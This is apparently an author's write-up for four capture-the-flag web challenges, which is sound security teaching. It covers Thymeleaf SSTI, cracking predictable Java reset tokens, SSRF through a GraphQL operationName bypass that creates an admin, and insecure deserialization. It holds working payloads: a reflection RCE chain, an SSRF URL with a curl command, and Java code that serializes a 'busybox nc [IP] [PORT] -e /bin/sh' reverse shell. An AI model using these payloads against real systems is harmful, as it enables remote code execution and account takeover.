# Konoha 
## overview

Konoha is a simple thymeleaf ssti challenge. 

``` html
 <div class="detail-item" th:unless="${os != null}">
    <span class="detail-label">Logged in via :</span>
    <span> couldn't get os</span>
</div>

```
the os variable is set via the header "sec-ch-ua-platform"

## exploit

thymeleaf provides a pretty strong sandbox for evaluating expressions.
but there have been a lot of ways to bypass it 

i found this report interesting:
https://modzero.com/en/blog/spring_boot_ssti/

read it to undertstand how to bypass thymeleaf sandbox


there is another exploit but its too complictated so i'll leave it here :

[complex solution](https://github.com/modzero/mod0-ssrf-chain/blob/master/ssrf-chain.py)

my idea is similar the one in the report:

```
 "".class.forName("org.apache.commons.lang3.reflect.MethodUtils").invokeMethod("".class.forName("org.apache.commons.lang3.reflect.MethodUtils").invokeStaticMethod("".class.forName("java.lang.Runtime"),"getRuntime"), "exec", "whoami")
```
this gives us blind rce

then all we need it a nc reverse shell to get our flag

# graphic 5atir 

## overview
this challenge is quite interesting.
its a graphql endpoint that has information disclosure vulnerability as well as insecure random number generation.

## exploit
first we need to know everything about the endpoint, every type, every field, every argument, query mutation, etc.
this is quite simple as introspection is enabled by default and there is a lot of queries online that can help us with that.
``` graphql
  #Full introspection query

query IntrospectionQuery {
    __schema {
        queryType {
            name
        }
        mutationType {
            name
        }
        subscriptionType {
            name
        }
        types {
         ...FullType
        }
        directives {
            name
            description
            args {
                ...InputValue
        }
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
            ...InputValue
        }
        type {
            ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
}

fragment InputValue on __InputValue {
    name
    description
    type {
        ...TypeRef
    }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}

```

introspection leaves us with a lot of interesting endpoints to test.

getallposts, resetPassword, requestPasswordReset and viewerToken:
getallposts returns a list of posts , which has a owner field that can be used to know emails and roles of different users.
```graphql
type Post {
    id: ID!
    title: String!
    content: String!
    owner: User!
    imageUrl: String!
}
type User {
    id: ID!
    username: String!
    Posts: [Post!]!
    email: String!
    role: String!
}
```
we can then use this query to get arbitrary user emails and roles:
``` graphql
query GetAllPosts {
    getallposts {
        id
        owner {
            id
            username
            email
            role
        }
    }
}
```
our goal here is to reset the admin's password,we already have his email, but we need the token still.
if we make a request to reset our password and view our token,using the viewerToken query, it will look smth like this:
MjUwNzE3MTUyMjhBeEtocmVMMnZLa2dJSHI=
which when base64 decoded will give us the token:
25071715228AxKhreL2vKkgIHr

25071715228 is a yymmddhhMM timestamp
the rest a random string 
since the backend is using java we will test againt insecure randomness in the RandomStringUtils.randomAlphanumeric function.
to know if its the one used here , we can generate random strings and match them against token generated by the app.
the random strings will be generated using a tool calles rsu-cracker:
https://github.com/elttam/rsu-cracker

``` bash
./target/release/rsu-cracker random-alphanumeric [RANDOM-STRING]

```

after we confirmed that the random strings generated by the webapp falls in our list , we can proceed our exploitation. 
All thats left now is to generate the future random strings using that tool, make a request to reset the admin's token , save the timestamp and reset his password
and the flag is ours.

we can bruteforce the timestamp if we didnt make the request , also we can try some different predictions from rsu crackers 
its easier since batching is possible via named queries.

read this to more undersatnd the insecure randomness vulnerability:
https://www.elttam.com/blog/cracking-randomness-in-java/


# graphic 5atir 2 
## overview
this one is kinda simple 
there is a ssrf vulnerability in the imageUrl field of the createTodo mutation.
as well as an endpoint that can make admin users that can only be accessed from localhost.
## exploit
there is some ssrf protection that can easily be bypassed by using a hex or int loopback address.
2130706433 or 0x7F000001
and since its a flask app its running internally on port 5000.
whats left here is to bypass the check that blocks mutations from get requests.

``` python

    if request.method == 'GET':
        query = request.args.get('query')
        variables = request.args.get('variables')
        operation_name = request.args.get('operationName')

        if not query:
            return jsonify({'errors': [{'message': 'GET requests require a query parameter'}]}), 400
        # blocks comments
        if '#' in query:
            return jsonify({'errors': [{'message': 'remove comments from query'}]}), 400

        # Match operation type and optionally operation name
        op_match = re.match(r'^\s*(query|mutation|subscription)?(\s+\w+)?\s*[{(]', query, re.IGNORECASE)

        if op_match:
            operation = (op_match.group(1) or "query").lower()
            if operation != "query":
                return jsonify({'errors': [{'message': f'{operation.capitalize()}s are only allowed via POST requests'}]}), 405
        else:
            return jsonify({'errors': [{'message': "malformed request"}]}), 405

```

this can easily be bypassed by using graphql's operation name field.

we end up then with this paylaod :

http://2130706433:5000/graphql?query=query%20a%20%7B%20me%20%7B%20id%20%7D%20%7D%20mutation%20b%20%7B%20createAdmin(username%3A%20%22theadmin1%22%2C%20password%3A%20%22PASSWORD%22%2C%20email%3A%20%22admin%40fli9.com%22)%20%7B%20id%20%7D%20%7D&operationName=b

the decoded query is :

``` graphql
query a { me { id } } 
mutation b { 
    createAdmin(username: "theadmin1", password: "PASSWORD", email: "admin@fli9.com") {
         id 
         } 
    }

```
by setting operationName=b we can bypass the check that blocks mutations from get requests.
create an admin user by making a request to createTodo mutation.

``` bash
curl  "http://172.189.56.236:1005/graphql" -H "Authorization: Bearer [TOKEN]"   -H "Content-Type: application/json"  -d '{"query": "mutation { createTodo(title:\"x\", content:\"x\", imageUrl:\"http://0x7F000001:5000/graphql?query=query%20a%20%7B%20me%20%7B%20id%20%7D%20%7D%20mutation%20b%20%7B%20createAdmin(username%3A%20%22theadmin1%22%2C%20password%3A%20%22PASSWORD%22%2C%20email%3A%20%22admin%40fli9.com%22)%20%7B%20id%20%7D%20%7D&operationName=b") { id } }"  

```

# faceboook

## overview
this is a basic insecure deserialization challenge.
but with a custom gadget it can be exploited to get a reverse shell.

## exploit
``` java
the custom gadget is the loghelper class .
package com.example.ctfapi.service;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serial;
import java.io.Serializable;

public class LogHelper extends LogService implements Serializable {
    @Serial
    private static final long serialVersionUID = 1L;
    public final String message;
    public LogHelper(String message) {
        this.message = message;
    }
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.defaultReadObject();
        log(this.message);
    }

}
```

which inherits from this logservice class and implements serializable
``` java
    package com.example.ctfapi.service;

import org.springframework.stereotype.Service;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.List;
import java.nio.file.Path;

@Service
public class LogService {

    public void log(String message) {
        try {
            String cmd = String.format("echo \"%s\" >> logs/logs.txt", message);
            Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public List<String> getLogs() {
        Path logsPath = Paths.get("logs", "logs.txt"); 

        try {
            List<String> logs = Files.readAllLines(logsPath);
            return logs;
        } catch (IOException e) {
            throw new RuntimeException("Failed to read logs from: " + logsPath, e);
        }
    }

}
```



to get rce here we need to create a serialized loghelper object with a message that will do a string escape and be executed in the log function.
the easiest thing to do here is to add this to the posts controller:
``` java
@GetMapping("/generate")
    public String generate() {
        LogHelper exploit = new LogHelper("pwned\" && busybox nc [IP] [PORT] -e /bin/sh && echo \"pwned");
        try{
        String string = serializationService.serialize(exploit);
        return string;
        }catch (Exception e){
            return "error";
        }

    }

```
and visit /api/posts/generate to get the serialized object.
honorable mention to the unintended exploit because i forgot to remove the logging i added for debugging when making the challenge.

``` java

package com.example.ctfapi.api.model;

import java.io.*;
import java.util.Base64;

public class Main {
    public static void main(String[] args) throws Exception {
        String message = "pwned\" && busybox nc [IP] [PORT]  -e /bin/sh && echo \"pwned";

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(bos);
        out.writeObject(message);
        out.close();

        String base64 = Base64.getEncoder().encodeToString(bos.toByteArray());
        System.out.println(base64);
    }
}

```

that works bc of this line here :
``` java

logService.log("deserialized object " + object.toString() + " at " + LocalDateTime.now());

```


# finally

i am happy that all my challenges are solved and i hope you enjoyed them.
also i hope i made you learn something new.
